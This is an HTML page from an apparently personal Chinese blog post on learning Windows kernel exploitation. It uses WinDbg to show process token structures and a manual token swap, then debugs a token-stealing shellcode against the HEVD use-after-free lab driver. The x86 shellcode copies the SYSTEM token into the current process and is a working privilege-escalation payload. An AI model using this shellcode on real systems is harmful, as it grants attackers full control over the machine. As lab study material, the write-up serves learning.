@@ -1,0 +1,1100 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="windows kernel,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="学习一下windows kernel">
+<meta name="keywords" content="windows kernel">
+<meta property="og:type" content="article">
+<meta property="og:title" content="windows kernel学习(一)">
+<meta property="og:url" content="https://sh1ner.github.io/2020/07/09/windows-kernel-1/index.html">
+<meta property="og:site_name" content="luckyu&#39;s blog">
+<meta property="og:description" content="学习一下windows kernel">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://sh1ner.github.io/2020/07/09/windows-kernel-1/images/1.png">
+<meta property="og:image" content="https://sh1ner.github.io/2020/07/09/windows-kernel-1/images/2.png">
+<meta property="og:updated_time" content="2020-07-09T14:52:30.717Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="windows kernel学习(一)">
+<meta name="twitter:description" content="学习一下windows kernel">
+<meta name="twitter:image" content="https://sh1ner.github.io/2020/07/09/windows-kernel-1/images/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://sh1ner.github.io/2020/07/09/windows-kernel-1/">
+
+
+
+
+
+  <title>windows kernel学习(一) | luckyu's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">luckyu's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://sh1ner.github.io/2020/07/09/windows-kernel-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content>
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="luckyu's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">windows kernel学习(一)</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-09T21:55:09+08:00">
+                2020-07-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>学习一下windows kernel</p>
+<a id="more"></a>
+<h2 id="提权原理"><a href="#提权原理" class="headerlink" title="提权原理"></a>提权原理</h2><p>类似于linux kernel中进程的特权由cred中uid等值管理，windows kernel在进程管理中有token值决定特权，但是其表示的值，并不像linux中一成不变，例如root权限为0，system权限的值需要我们可以通过查询一些具有system权限例如system进程的token值获得。<br>这里采用windbg+virtualKD进行双机调试：<br>通过<code>!dml_proc</code>查看当前进程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; !dml_proc</span><br><span class="line">Address  PID  Image file name</span><br><span class="line">867ee8e8 4    System         </span><br><span class="line">8730e920 fc   smss.exe       </span><br><span class="line">879d08f0 154  csrss.exe      </span><br><span class="line">87b96d40 188  wininit.exe    </span><br><span class="line">87b9b030 190  csrss.exe      </span><br><span class="line">87bd7d40 1d4  winlogon.exe   </span><br><span class="line">87bdad40 1e4  services.exe   </span><br><span class="line">87c05ad0 20c  lsass.exe      </span><br><span class="line">87bfdb88 214  lsm.exe        </span><br><span class="line">87c4a900 280  svchost.exe</span><br></pre></td></tr></table></figure>
+
+<p>可以看到system进程的pid为4，这个经调试发现是一成不变的，我们后续可以通过这点来编写shellcode，然后我们继续查询进程信息，可以通过<code>dt _EPROCESS 867ee8e8</code>查看：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dt _EPROCESS 867ee8e8</span><br><span class="line">ntdll!_EPROCESS</span><br><span class="line">   +0x000 Pcb              : _KPROCESS</span><br><span class="line">   +0x098 ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +0x0a0 CreateTime       : _LARGE_INTEGER 0x01d655dd`d70e4c0f</span><br><span class="line">   +0x0a8 ExitTime         : _LARGE_INTEGER 0x0</span><br><span class="line">   +0x0b0 RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">   +0x0b4 UniqueProcessId  : 0x00000004 Void</span><br><span class="line">   +0x0b8 ActiveProcessLinks : _LIST_ENTRY [ 0x8730e9d8 - 0x83f4ff18 ]</span><br><span class="line">   +0x0c0 ProcessQuotaUsage : [2] 0</span><br><span class="line">   +0x0c8 ProcessQuotaPeak : [2] 0</span><br><span class="line">   +0x0d0 CommitCharge     : 0xc</span><br><span class="line">   +0x0d4 QuotaBlock       : 0x83f43cc0 _EPROCESS_QUOTA_BLOCK</span><br><span class="line">   +0x0d8 CpuQuotaBlock    : (null) </span><br><span class="line">   +0x0dc PeakVirtualSize  : 0x7f1000</span><br><span class="line">   +0x0e0 VirtualSize      : 0x270000</span><br><span class="line">   +0x0e4 SessionProcessLinks : _LIST_ENTRY [ 0x0 - 0x0 ]</span><br><span class="line">   +0x0ec DebugPort        : (null) </span><br><span class="line">   +0x0f0 ExceptionPortData : (null) </span><br><span class="line">   +0x0f0 ExceptionPortValue : 0</span><br><span class="line">   +0x0f0 ExceptionPortState : 0y000</span><br><span class="line">   +0x0f4 ObjectTable      : 0x8b201b00 _HANDLE_TABLE</span><br><span class="line">   +0x0f8 Token            : _EX_FAST_REF</span><br><span class="line">   +0x0fc WorkingSetPage   : 0</span><br><span class="line">   +0x100 AddressCreationLock : _EX_PUSH_LOCK</span><br><span class="line">   +0x104 RotateInProgress : (null) </span><br><span class="line">   +0x108 ForkInProgress   : (null) </span><br><span class="line">   +0x10c HardwareTrigger  : 0</span><br><span class="line">   +0x110 PhysicalVadRoot  : 0x868102e0 _MM_AVL_TABLE</span><br><span class="line">   +0x114 CloneRoot        : (null) </span><br><span class="line">   +0x118 NumberOfPrivatePages : 4</span><br><span class="line">   +0x11c NumberOfLockedPages : 0x40</span><br><span class="line">   +0x120 Win32Process     : (null) </span><br><span class="line">   +0x124 Job              : (null) </span><br><span class="line">   +0x128 SectionObject    : (null) </span><br><span class="line">   +0x12c SectionBaseAddress : (null) </span><br><span class="line">   +0x130 Cookie           : 0</span><br><span class="line">   +0x134 Spare8           : 0</span><br><span class="line">   +0x138 WorkingSetWatch  : (null) </span><br><span class="line">   +0x13c Win32WindowStation : (null) </span><br><span class="line">   +0x140 InheritedFromUniqueProcessId : (null) </span><br><span class="line">   +0x144 LdtInformation   : (null) </span><br><span class="line">   +0x148 VdmObjects       : (null) </span><br><span class="line">   +0x14c ConsoleHostProcess : 0</span><br><span class="line">   +0x150 DeviceMap        : 0x8b2088d8 Void</span><br><span class="line">   +0x154 EtwDataSource    : (null) </span><br><span class="line">   +0x158 FreeTebHint      : 0x7ffe0000 Void</span><br><span class="line">   +0x160 PageDirectoryPte : _HARDWARE_PTE_X86</span><br><span class="line">   +0x160 Filler           : 0</span><br><span class="line">   +0x168 Session          : (null) </span><br><span class="line">   +0x16c ImageFileName    : [15]  &quot;System&quot;</span><br><span class="line">   +0x17b PriorityClass    : 0x2 &apos;&apos;</span><br><span class="line">   +0x17c JobLinks         : _LIST_ENTRY [ 0x0 - 0x0 ]</span><br><span class="line">   +0x184 LockedPagesList  : (null) </span><br><span class="line">   +0x188 ThreadListHead   : _LIST_ENTRY [ 0x867ee878 - 0x869d8f70 ]</span><br><span class="line">   +0x190 SecurityPort     : (null) </span><br><span class="line">   +0x194 PaeTop           : 0x83f54fc0 Void</span><br><span class="line">   +0x198 ActiveThreads    : 0x5f</span><br><span class="line">   +0x19c ImagePathHash    : 0</span><br><span class="line">   +0x1a0 DefaultHardErrorProcessing : 1</span><br><span class="line">   +0x1a4 LastThreadExitStatus : 0n0</span><br><span class="line">   +0x1a8 Peb              : (null) </span><br><span class="line">   +0x1ac PrefetchTrace    : _EX_FAST_REF</span><br><span class="line">   +0x1b0 ReadOperationCount : _LARGE_INTEGER 0x98</span><br><span class="line">   +0x1b8 WriteOperationCount : _LARGE_INTEGER 0x195</span><br><span class="line">   +0x1c0 OtherOperationCount : _LARGE_INTEGER 0x189c</span><br><span class="line">   +0x1c8 ReadTransferCount : _LARGE_INTEGER 0x184f8f8</span><br><span class="line">   +0x1d0 WriteTransferCount : _LARGE_INTEGER 0x6c8080</span><br><span class="line">   +0x1d8 OtherTransferCount : _LARGE_INTEGER 0x751bd</span><br><span class="line">   +0x1e0 CommitChargeLimit : 0</span><br><span class="line">   +0x1e4 CommitChargePeak : 0x4e</span><br><span class="line">   +0x1e8 AweInfo          : (null) </span><br><span class="line">   +0x1ec SeAuditProcessCreationInfo : _SE_AUDIT_PROCESS_CREATION_INFO</span><br><span class="line">   +0x1f0 Vm               : _MMSUPPORT</span><br><span class="line">   +0x25c MmProcessLinks   : _LIST_ENTRY [ 0x8730eb7c - 0x83f4289c ]</span><br><span class="line">   +0x264 HighestUserAddress : (null) </span><br><span class="line">   +0x268 ModifiedPageCount : 0x58e44</span><br><span class="line">   +0x26c Flags2           : 0x2d800</span><br><span class="line">   +0x26c JobNotReallyActive : 0y0</span><br><span class="line">   +0x26c AccountingFolded : 0y0</span><br><span class="line">   +0x26c NewProcessReported : 0y0</span><br><span class="line">   +0x26c ExitProcessReported : 0y0</span><br><span class="line">   +0x26c ReportCommitChanges : 0y0</span><br><span class="line">   +0x26c LastReportMemory : 0y0</span><br><span class="line">   +0x26c ReportPhysicalPageChanges : 0y0</span><br><span class="line">   +0x26c HandleTableRundown : 0y0</span><br><span class="line">   +0x26c NeedsHandleRundown : 0y0</span><br><span class="line">   +0x26c RefTraceEnabled  : 0y0</span><br><span class="line">   +0x26c NumaAware        : 0y0</span><br><span class="line">   +0x26c ProtectedProcess : 0y1</span><br><span class="line">   +0x26c DefaultPagePriority : 0y101</span><br><span class="line">   +0x26c PrimaryTokenFrozen : 0y1</span><br><span class="line">   +0x26c ProcessVerifierTarget : 0y0</span><br><span class="line">   +0x26c StackRandomizationDisabled : 0y1</span><br><span class="line">   +0x26c AffinityPermanent : 0y0</span><br><span class="line">   +0x26c AffinityUpdateEnable : 0y0</span><br><span class="line">   +0x26c PropagateNode    : 0y0</span><br><span class="line">   +0x26c ExplicitAffinity : 0y0</span><br><span class="line">   +0x270 Flags            : 0x14040800</span><br><span class="line">   +0x270 CreateReported   : 0y0</span><br><span class="line">   +0x270 NoDebugInherit   : 0y0</span><br><span class="line">   +0x270 ProcessExiting   : 0y0</span><br><span class="line">   +0x270 ProcessDelete    : 0y0</span><br><span class="line">   +0x270 Wow64SplitPages  : 0y0</span><br><span class="line">   +0x270 VmDeleted        : 0y0</span><br><span class="line">   +0x270 OutswapEnabled   : 0y0</span><br><span class="line">   +0x270 Outswapped       : 0y0</span><br><span class="line">   +0x270 ForkFailed       : 0y0</span><br><span class="line">   +0x270 Wow64VaSpace4Gb  : 0y0</span><br><span class="line">   +0x270 AddressSpaceInitialized : 0y10</span><br><span class="line">   +0x270 SetTimerResolution : 0y0</span><br><span class="line">   +0x270 BreakOnTermination : 0y0</span><br><span class="line">   +0x270 DeprioritizeViews : 0y0</span><br><span class="line">   +0x270 WriteWatch       : 0y0</span><br><span class="line">   +0x270 ProcessInSession : 0y0</span><br><span class="line">   +0x270 OverrideAddressSpace : 0y0</span><br><span class="line">   +0x270 HasAddressSpace  : 0y1</span><br><span class="line">   +0x270 LaunchPrefetched : 0y0</span><br><span class="line">   +0x270 InjectInpageErrors : 0y0</span><br><span class="line">   +0x270 VmTopDown        : 0y0</span><br><span class="line">   +0x270 ImageNotifyDone  : 0y0</span><br><span class="line">   +0x270 PdeUpdateNeeded  : 0y0</span><br><span class="line">   +0x270 VdmAllowed       : 0y0</span><br><span class="line">   +0x270 CrossSessionCreate : 0y0</span><br><span class="line">   +0x270 ProcessInserted  : 0y1</span><br><span class="line">   +0x270 DefaultIoPriority : 0y010</span><br><span class="line">   +0x270 ProcessSelfDelete : 0y0</span><br><span class="line">   +0x270 SetTimerResolutionLink : 0y0</span><br><span class="line">   +0x274 ExitStatus       : 0n259</span><br><span class="line">   +0x278 VadRoot          : _MM_AVL_TABLE</span><br><span class="line">   +0x298 AlpcContext      : _ALPC_PROCESS_CONTEXT</span><br><span class="line">   +0x2a8 TimerResolutionLink : _LIST_ENTRY [ 0x0 - 0x0 ]</span><br><span class="line">   +0x2b0 RequestedTimerResolution : 0</span><br><span class="line">   +0x2b4 ActiveThreadsHighWatermark : 0x65</span><br><span class="line">   +0x2b8 SmallestTimerResolution : 0</span><br><span class="line">   +0x2bc TimerResolutionStackRecord : (null)</span><br></pre></td></tr></table></figure>
+
+<p>其中偏移0xb4的位置为进程的pid，0xb8偏移处的ActiveProcessLinks作为指针指向下一个进程的ActiveProcessLinks处，0xf8为进程的token其类型为_EX_FAST_REF。这里我们为了验证修改进程token可以实现提权，打开一个cmd进程，并将其token改为system进程的token，首先查询system进程token：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dt _EX_FAST_REF 867ee8e8+f8</span><br><span class="line">ntdll!_EX_FAST_REF</span><br><span class="line">   +0x000 Object           : 0x8b201267 Void</span><br><span class="line">   +0x000 RefCnt           : 0y111</span><br><span class="line">   +0x000 Value            : 0x8b201267</span><br></pre></td></tr></table></figure>
+
+<p>同理，找到cmd进程的token所在位置为8805fa50+f8,使用<code>ed 8805fa50+f8 0x8b201267</code>修改其值，发现提权成功：<br><img src="images/1.png" alt></p>
+<h2 id="shellcode调试"><a href="#shellcode调试" class="headerlink" title="shellcode调试"></a>shellcode调试</h2><p>shellcode编写就是通过汇编来实现我们以上的那些操作，从找到system进程的token到将此token覆盖掉当前进程token的这一过程。这部分内容参考thunderj师傅的文章<a href="https://thunderjie.github.io/2019/06/28/Windows-Kernel-Exploit/" target="_blank" rel="noopener">https://thunderjie.github.io/2019/06/28/Windows-Kernel-Exploit/</a>，详细过程可以去看师傅的解析，利用HEVD这个漏洞环境中的uaf漏洞，覆盖结构体中函数指针，从而实现类似于Linux kernel利用这ret2usr的操作来到达用户空间执行我们的shellcode(摘自thunderj师傅)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">void ShellCode()</span><br><span class="line">&#123;</span><br><span class="line">    _asm </span><br><span class="line">    &#123;</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        pushad</span><br><span class="line">        mov eax,fs:[124h]		// 找到当前线程的_KTHREAD结构</span><br><span class="line">        mov eax, [eax + 0x50]    // 找到_EPROCESS结构</span><br><span class="line">        mov ecx, eax</span><br><span class="line">        mov edx, 4    // edx = system PID(4)</span><br><span class="line"></span><br><span class="line">        // 循环是为了获取system的_EPROCESS</span><br><span class="line">    find_sys_pid:</span><br><span class="line">        mov eax, [eax + 0xb8]	// 找到进程活动链表</span><br><span class="line">        sub eax, 0xb8    		// 链表遍历</span><br><span class="line">        cmp [eax + 0xb4], edx    // 根据PID判断是否为SYSTEM</span><br><span class="line">        jnz find_sys_pid</span><br><span class="line"></span><br><span class="line">        // 替换Token</span><br><span class="line">        mov edx, [eax + 0xf8]</span><br><span class="line">        mov [ecx + 0xf8], edx</span><br><span class="line">        popad</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里我记录一下我的调试shellcode的办法，以免在shellcode执行中出现栈不平衡等问题导致crash，大家可以配合来看。首先为了方便调试我们在windbg中加入hevd的符号：<br><img src="images/2.png" alt><br>然后我们就可以找到hevd中的函数，根据UAF漏洞的触发源码里得知是在<code>UseUaFObjectNonPagedPool</code>中由于修改了<code>g_UseAfterFreeObjectNonPagedPool-&gt;Callback</code>，我们最终调用了shellcode的执行，所以要在windbg中找到<code>UseUaFObjectNonPagedPool</code>。首先我们加载hevd驱动，找到hevd驱动信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; lm m HEVD</span><br><span class="line">Browse full module list</span><br><span class="line">start    end        module name</span><br><span class="line">9454b000 94595000   HEVD       (private pdb symbols)  d:\hevd.3.00\driver\vulnerable\x86\HEVD.pdb</span><br><span class="line"></span><br><span class="line">0: kd&gt; lmDvmHEVD</span><br><span class="line">Browse full module list</span><br><span class="line">start    end        module name</span><br><span class="line">9454b000 94595000   HEVD       (deferred)             </span><br><span class="line">    Image path: HEVD.sys</span><br><span class="line">    Image name: HEVD.sys</span><br><span class="line">    Browse all global symbols  functions  data</span><br><span class="line">    Timestamp:        Tue Jul  2 20:19:05 2019 (5D1B4BB9)</span><br><span class="line">    CheckSum:         0000C477</span><br><span class="line">    ImageSize:        0004A000</span><br><span class="line">    Translations:     0000.04b0 0000.04e4 0409.04b0 0409.04e4</span><br><span class="line">    Information from resource tables:</span><br><span class="line"></span><br><span class="line">Unable to enumerate user-mode unloaded modules, Win32 error 0n30</span><br></pre></td></tr></table></figure>
+
+<p>点击functions找到<code>UseUaFObjectNonPagedPool</code>函数，并利用<code>bp</code>指令下断点：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; x /D HEVD!g*</span><br><span class="line"> A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</span><br><span class="line"></span><br><span class="line">9454e018          HEVD!g_ARWHelperObjectNonPagedPoolNx = struct _ARW_HELPER_OBJECT_NON_PAGED_POOL_NX *[65535]</span><br><span class="line">9458e014          HEVD!g_UseAfterFreeObjectNonPagedPool = 0x8693f4c8</span><br><span class="line">9454d050          HEVD!GuardCheckLongJumpTargetImpl = 0x00000000</span><br><span class="line">9458e018          HEVD!g_UseAfterFreeObjectNonPagedPoolNx = 0x00000000</span><br><span class="line">9458fa2c          HEVD!GetArbitraryReadWriteHelperObjecNameNonPagedPoolNxIoctlHandler (struct _IRP *, struct _IO_STACK_LOCATION *)</span><br><span class="line">945930ea          HEVD!GsDriverEntry (struct _DRIVER_OBJECT *, struct _UNICODE_STRING *)</span><br><span class="line">9458fa4c          HEVD!GetFreeIndex (void)</span><br><span class="line">9458fa6a          HEVD!GetIndexFromPointer (void *)</span><br><span class="line">9458f912          HEVD!GetArbitraryReadWriteHelperObjecNameNonPagedPoolNx (struct _ARW_HELPER_OBJECT_IO *)</span><br><span class="line">0: kd&gt; dt 9458e014</span><br><span class="line">Symbol not found at address 9458e014.</span><br></pre></td></tr></table></figure>
+
+<p>运行程序暂停的断点位置，然后我们找到<code>HEVD!g_UseAfterFreeObjectNonPagedPool</code>变量，查看现在它的值，可以发现已经被我们更改：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dx -r1 ((HEVD!_USE_AFTER_FREE_NON_PAGED_POOL *)0x8693f4c8)</span><br><span class="line">((HEVD!_USE_AFTER_FREE_NON_PAGED_POOL *)0x8693f4c8)                 : 0x8693f4c8 [Type: _USE_AFTER_FREE_NON_PAGED_POOL *]</span><br><span class="line">    [+0x000] Callback         : 0x1341195 [Type: void (*)(...)]</span><br><span class="line">    [+0x004] Buffer           : &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot; [Type: char [84]]</span><br></pre></td></tr></table></figure>
+
+<p>可以用<code>uf 0x1341195</code>查看callback里的函数指令，我们在该处下断点就可以调试我们的shellcode了。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/windows-kernel/" rel="tag"># windows kernel</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/07/07/SCTF-2020-PWN/" rel="next" title="SCTF 2020 PWN">
+                <i class="fa fa-chevron-left"></i> SCTF 2020 PWN
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
